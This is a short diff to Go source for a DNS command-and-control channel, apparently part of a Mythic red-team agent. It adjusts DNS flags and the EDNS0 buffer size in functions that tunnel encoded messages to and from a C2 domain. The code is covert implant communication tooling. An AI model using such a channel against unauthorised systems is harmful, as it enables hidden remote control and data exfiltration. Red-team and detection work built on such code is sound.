@@ -661,7 +661,7 @@ func (c *C2DNS) streamDNSPacketToServer(msg string) uint32 {
 		chunkErrors := 0
 		for i := 0; i < chunks && chunkErrors < 10; i++ {
 			m := new(dns.Msg)
-			m.RecursionAvailable = true
+			//m.RecursionAvailable = true
 			m.RecursionDesired = true
 			jsonData, err := proto.Marshal(sendingStream.Messages[sendingStream.StartBytes[i]])
 			if err != nil {
@@ -678,7 +678,7 @@ func (c *C2DNS) streamDNSPacketToServer(msg string) uint32 {
 				}
 			}
 			m = m.SetQuestion(dns.Fqdn(finalData+domain), c.getRequestType())
-			m = m.SetEdns0(4096, true)
+			m = m.SetEdns0(1232, true)
 			//utils.PrintDebug(fmt.Sprintf("sending to Mythic: chunk: %d, domain: %s\n", sendingStream.StartBytes[i], dns.Fqdn(finalData+domain)))
 			//utils.PrintDebug(fmt.Sprintf("sending to Mythic: Total domain length: %d\n", len(finalData+domain)))
 			//utils.PrintDebug(fmt.Sprintf("%v\n", m))
@@ -831,7 +831,7 @@ func (c *C2DNS) getDNSMessageFromServer(messageID uint32) []byte {
 			domain := c.getDomain()
 			utils.PrintDebug(fmt.Sprintf("getting message (%d) from server via domain (%s)", messageID, domain))
 			m := new(dns.Msg)
-			m.RecursionAvailable = true
+			//m.RecursionAvailable = true
 			m.RecursionDesired = true
 			jsonData, err := proto.Marshal(request)
 			if err != nil {
@@ -848,7 +848,7 @@ func (c *C2DNS) getDNSMessageFromServer(messageID uint32) []byte {
 				}
 			}
 			m = m.SetQuestion(dns.Fqdn(finalData+domain), c.getRequestType())
-			m = m.SetEdns0(4096, true)
+			m = m.SetEdns0(1232, true)
 			//utils.PrintDebug(fmt.Sprintf("get message From Mythic: chunk: %d, domain: %s\n", lastChunk, dns.Fqdn(finalData+domain)))
 			//utils.PrintDebug(fmt.Sprintf("Total domain length: %d\n", len(finalData+domain)))
 			//utils.PrintDebug(fmt.Sprintf("%v\n", m))
